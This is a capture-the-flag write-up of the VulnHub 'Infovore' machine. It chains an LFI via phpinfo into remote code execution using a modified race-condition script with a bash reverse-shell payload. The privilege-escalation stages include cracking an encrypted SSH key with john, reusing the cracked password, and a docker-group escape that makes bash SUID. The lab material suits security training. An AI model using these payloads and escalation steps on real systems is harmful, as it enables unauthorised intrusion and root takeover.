---
layout: single
title: Infovore - VulnHub
excerpt: "This is an easy to intermediate box that shows you how you can exploit innocent looking php functions and lazy sys admins.There are 4 flags in total to be found, and you will have to think outside the box and try alternative ways to achieve your goal of capturing all flags."
date: 2025-07-10
classes: wide
header:
  teaser: /assets/images/2024-08-15-vulnhub-infovore/web_interface.png
  teaser_home_page: true
  icon: # /assets/images/vulnhub-logo.png
categories:
  - vulnhub
  - web vulnerabilities
  - scripting
  - containers
  - cracking
tags:
  - john the ripper
  - ssh
  - phpinfo
  - abusing
  - RCE
  - LFI
  - docker breakout
  - pyhthon
---

![](/assets/images/2024-08-15-vulnhub-infovore/web_interface.png)

# Hack The Machine

This is an easy to intermediate box that shows you how you can exploit innocent looking php functions and lazy sys admins.

There are 4 flags in total to be found, and you will have to think outside the box and try alternative ways to achieve your goal of capturing all flags.

## PortScan

```
# Nmap 7.94SVN scan initiated Thu Aug 15 17:37:03 2024 as: nmap -sCV -p80 -oN target 192.168.1.22
Nmap scan report for 192.168.1.22
Host is up (0.00035s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Include me ...
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:68:8A:B4 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 15 17:37:10 2024 -- 1 IP address (1 host up) scanned in 7.02 seconds
```

## WebServer

![](/assets/images/2024-08-15-vulnhub-infovore/web_interface_2.png)

We analyzed the website extensively but found nothing. So we start with fuzzing:

```
gobuster dir -u http://192.168.1.22/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,php.bak,php.back,bak,back,txt-t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,php.bak,php.back,bak,back,txt-t
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 4743]
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.22/img/]
/info.php             (Status: 200) [Size: 69767]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.22/css/]
/vendor               (Status: 301) [Size: 313] [--> http://192.168.1.22/vendor/]
Progress: 26513 / 1543927 (1.72%)^C
```
We are interested in **phpinfo** because it gives us a lot of information about the server and directives that are applied. Looking at the **phpinfo** we find the following actives directives:

```
Directive	    Local Value	    Master Value
allow_url_fopen	   On	            On 
file_uploads	   On	            On
```

![](/assets/images/2024-08-15-vulnhub-infovore/phpinfo.png)

**File Uploads** allows us to upload a file to the server, but first we need a LFI and then convert it to a RCE. To find the LFI we have to do the following:

```
wfuzz -c --hl=136 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://192.168.1.22/index.php?FUZZ=/etc/passwd"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.22/index.php?FUZZ=/etc/passwd
Total requests: 1273833

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000028911:   200        26 L     33 W       1006 Ch     "filename"  
```

![](/assets/images/2024-08-15-vulnhub-infovore/passwd-list.png)

At this point we find a **LFI**, then we use the following exploit to automate this process:

Link: [phpinfolfi.py](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)

But this exploit needs some changes:

```
In this function we have to change the values for our values, like that:

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.21/443 0>&1'"); ?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r

```

Another important thing is when we create the php file in the temporary path it looks like **[tmp_name] =&gt; /tmp/phpidsMp** but in the script look different and this's a problem **[tmp_name] => /tmp/phpdsdKs**, we need to change this for the correct operation of the script.

```
First case:

i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

Second case:

  try:
        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
  except ValueError:
        return None
```


Afeter doing this we can execute the script:

```
python2.7 phpinfolfi.py 192.168.1.22 80
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 111432
Spawning worker pool (10)...
  20 /  1000
Got it! Shell created in /tmp/g

Woot!  \m/
Shuttin' down...

```

And we are inside of the machine:

```
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.21] from (UNKNOWN) [192.168.1.22] 54450
www-data@e71b67461f6c:/var/www/html$ whoami
whoami
www-data
www-data@e71b67461f6c:/var/www/html$ 
```

## Privilege Escalation

We started with an exhaustive scan of the machine, listing SUID permissions, capabilities, processes etc but found nothing at this point we tried using linPEAS to perform a much more exhaustive scan:

Link: [githubLink](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

And we found the following:

```
╔══════════╣ Unexpected in root
/.dockerenv
/core
/.oldkeys.tgz
```

A file old.key.tgz that we unzip and we can see the root ssh keys:

```
www-data@e71b67461f6c:/dev/shm$ ls
oldkeys.tgz  root  root.pub
www-data@e71b67461f6c:/dev/shm$ file *
oldkeys.tgz: gzip compressed data, last modified: Mon Apr 27 10:18:58 2020, from Unix, original size 10240
root:        PEM DSA private key
root.pub:    OpenSSH DSA public key
www-data@e71b67461f6c:/dev/shm$ cat root
-----BEGIN DSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2037F380706D4511A1E8D114860D9A0E

ds7T1dLfxm7o0NC93POQLLjptTjMMFVJ4qxNlO2Xt+rBqgAG7YQBy6Tpj2Z2VxZb
uyMe0vMyIpN9jNFeOFbL42RYrMV0V50VTd/s7pYqrp8hHYWdX0+mMfKfoG8UaqWy
gBdYisUpRpmyVwG1zQQF1Tl7EnEWkH1EW6LOA9hGg6DrotcqWHiofiuNdymPtlN+
it/uUVfSli+BNRqzGsN01creG0g9PL6TfS0qNTkmeYpWxt7Y+/R+3pyaTBHG8hEe
zZcX24qvW1KY2ArpSSKYlXZw+BwR5CLk6S/9UlW4Gls9YRK7Jl4mzBGdtpP85a/p
fLowmWKRmqCw2EH87mZUKYaf02w1jbVWyjXOy8SwNCNr87zJstQpmgOISUc7Cknq
JEpv1kzXEVJCfeeA1163du4RFfETFauxALtKLylAqMs4bqcOJm1NVuHAmJdz4+VT
GRSmO/+B+LNLiGJm9/7aVFGi95kuoxFstIkG3HWVodYLE/FUbVqOjqsIBJxoK3rB
t75Yskdgr3QU9vkEGTZWbI3lYNrF0mDTiqNHKjsoiekhSaUBM80nAdEfHzSs2ySW
EQDd4Hf9/Ln3w5FThvUf+g==
-----END DSA PRIVATE KEY-----
```

At this point we look for the IP of the real machine and check by sending an empty string to **/dev/tcp** if port 22 is enabled for us to connect.

```
www-data@e71b67461f6c:/dev/shm$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
192.168.150.1    0x1         0x2         02:42:c6:af:c9:cd     *        eth0
www-data@e71b67461f6c:/dev/shm$ echo '' > /dev/tcp/192.168.150.1/22 && echo "[+] OPEN" || echo "[-] CLOSSED"
[+] OPEN
www-data@e71b67461f6c:/dev/shm$ echo '' > /dev/tcp/192.168.150.1/21 && echo "[+] OPEN" || echo "[-] CLOSSED"
bash: connect: Connection refused
bash: /dev/tcp/192.168.150.1/21: Connection refused
[-] CLOSSED
www-data@e71b67461f6c:/dev/shm$ 
```

Before connecting we have to decrypt the private key because it's encrypted, to do this we have to do the following:


```
In our machine:
❯ locate ssh2john.py
/usr/share/john/ssh2john.py
❯ python2.7 /usr/share/john/ssh2john.py id_rsa > hash.txt
❯ cat hash.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ id_rsa:$sshng$1$16$2037F380706D4511A1E8D114860D9A0E$448$76ced3d5d2dfc66ee8d0d0bddcf3902cb8e9b538cc305549e2ac4d94ed97b7eac1aa0006ed8401cba4e98f667657165bbb231ed2f33222937d8cd1
       │ e3856cbe36458acc574579d154ddfecee962aae9f211d859d5f4fa631f29fa06f146aa5b28017588ac5294699b25701b5cd0405d5397b127116907d445ba2ce03d84683a0eba2d72a5878a87e2b8d77298fb6537e8adfe
       │ 5157d2962f81351ab31ac374d5cade1b483d3cbe937d2d2a353926798a56c6ded8fbf47ede9c9a4c11c6f2111ecd9717db8aaf5b5298d80ae9492298957670f81c11e422e4e92ffd5255b81a5b3d6112bb265e26cc119d
       │ 693fce5afe97cba309962919aa0b0d841fcee665429869fd36c358db556ca35cecbc4b034236bf3bcc9b2d4299a038849473b0a49ea244a6fd64cd71152427de780d75eb776ee1115f11315abb100bb4a2f2940a8cb386
       │ a70e266d4d56e1c0989773e3e5531914a63bff81f8b34b886266f7feda5451a2f7992ea3116cb48906dc7595a1d60b13f1546d5a8e8eab08049c682b7ac1b7be58b24760af7414f6f9041936566c8de560dac5d260d38a
       │ 3472a3b2889e92149a50133cd2701d11f1f34acdb24961100dde077fdfcb9f7c3915386f51ffa
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

    /media/arc4he/usb_4G/ResolutionOfMachines/Inforvore/content  ✔  with   john -w:/usr/share/wordlists/rockyou.txt hash.txt

❯ john hash.txt --show
id_rsa:choclate93

1 password hash cracked, 0 left
```

When we try to connect via ssh it does not work:

```
www-data@e71b67461f6c:/dev/shm$ ssh -i root root@192.168.150.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '192.168.150.1 (192.168.150.1)' can't be established.
ECDSA key fingerprint is SHA256:47B5q99t6wwHcxTX3Yff0gVrP/Ieun/2T9scPz20xHc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
root@192.168.150.1's password: 
Permission denied, please try again.
root@192.168.150.1's password: 
```

But another thing we can do is try to be root with the cracked password in the docker container:

```
www-data@e71b67461f6c:/dev/shm$ su root
Password: 
root@e71b67461f6c:/dev/shm# whoami
root
root@e71b67461f6c:/dev/shm# 
```

We can get the flag to be root on the docker container:

```
root@e71b67461f6c:~# ls
root.txt
root@e71b67461f6c:~# cat root.txt 
FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it}

And onwards and upwards!
root@e71b67461f6c:~# 
```

The next step is to breakout of this container, to do this in the directory **/root/.ssh** we can see the keys to connect via ssh, analysing this key we understand user admin can connect with this container. As a curiosity we try to connect via ssh with admin reusing the password **choclate93**.

```
root@e71b67461f6c:~/.ssh# ls
id_rsa	id_rsa.pub  known_hosts
root@e71b67461f6c:~/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN/keLDJowDdeSdHZz26wS1M2o2/eiJ99+acchRJr0lZE0YmqbfoIo+n75VS+eLiT03yonunkVp+lhK+uey7/Tu8JsQSHK1F0gci5FG7MKRU4/+m+0CODwVFTNgw3E4FKg5qu+nt6BkBThU3Vnhe/Ujbp5ruNjb4pPajll2Pv5dyRfaRrn0DTnhpBdeXWdIhU9QQgtxzmUXed/77rV6m4AL4+iENigp3YcPOjF7zUG/NEop9c1wdGpjSEhv/ftjyKoazFEmOI1SGpD3k9VZlIUFs/uw6kRVDJlg9uxT4Pz0tIEMVizlV4oZgcEyOJ9NkSe6ePUAHG7F+v7VjbYdbVh admin@192.168.150.1
root@e71b67461f6c:~/.ssh# 

root@e71b67461f6c:~/.ssh# ssh admin@192.168.150.1
Enter passphrase for key '/root/.ssh/id_rsa': 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug 16 08:56:12 2024 from 192.168.150.21
admin@infovore:~$ 

```
And it's work! We can see the flag:

```
admin@infovore:~$ ls
admin.txt
admin@infovore:~$ cat admin.txt 
FLAG{Escaped_from_D0ck3r}
admin@infovore:~$ 
```

At this point we have to do a thorough scan again, but one thing that caught my attention is that this machine is using docker and we try to list with the **id** command the groups of the admin user, bingo we found that the admin user is in the docker group

```
admin@infovore:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
admin@infovore:~$ 
```

To become a **ROOT** we have to do the following

```
admin@infovore:~$ docker pull ubuntu:latest
latest: Pulling from library/ubuntu
9c704ecd0c69: Pull complete 
Digest: sha256:2e863c44b718727c860746568e1d54afd13b2fa71b160f5cd9058fc436217b30
Status: Downloaded newer image for ubuntu:latest

admin@infovore:~$ docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
864b7ba1b33099324215eb1688053f8a16fb951ea4aaf5b80fa21002e948e364

admin@infovore:~$ docker exec -it privesc bash
root@864b7ba1b330:/# chmod u+s /mnt/root/bin/bash
root@864b7ba1b330:/# exit
exit
```

Now we are **ROOT**

```
admin@infovore:~$ bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt 
 _____                             _       _                                              
/  __ \                           | |     | |                                             
| /  \/ ___  _ __   __ _ _ __ __ _| |_ ___| |                                             
| |    / _ \| '_ \ / _` | '__/ _` | __/ __| |                                             
| \__/\ (_) | | | | (_| | | | (_| | |_\__ \_|                                             
 \____/\___/|_| |_|\__, |_|  \__,_|\__|___(_)                                             
                    __/ |                                                                 
                   |___/                                                                  
__   __                                         _   _        __                         _ 
\ \ / /                                        | | (_)      / _|                       | |
 \ V /___  _   _   _ ____      ___ __   ___  __| |  _ _ __ | |_ _____   _____  _ __ ___| |
  \ // _ \| | | | | '_ \ \ /\ / / '_ \ / _ \/ _` | | | '_ \|  _/ _ \ \ / / _ \| '__/ _ \ |
  | | (_) | |_| | | |_) \ V  V /| | | |  __/ (_| | | | | | | || (_) \ V / (_) | | |  __/_|
  \_/\___/ \__,_| | .__/ \_/\_/ |_| |_|\___|\__,_| |_|_| |_|_| \___/ \_/ \___/|_|  \___(_)
                  | |                                                                     
                  |_|                                                                     
 
FLAG{And_now_You_are_done}

@theart42 and @4nqr34z
 
bash-4.3# 
```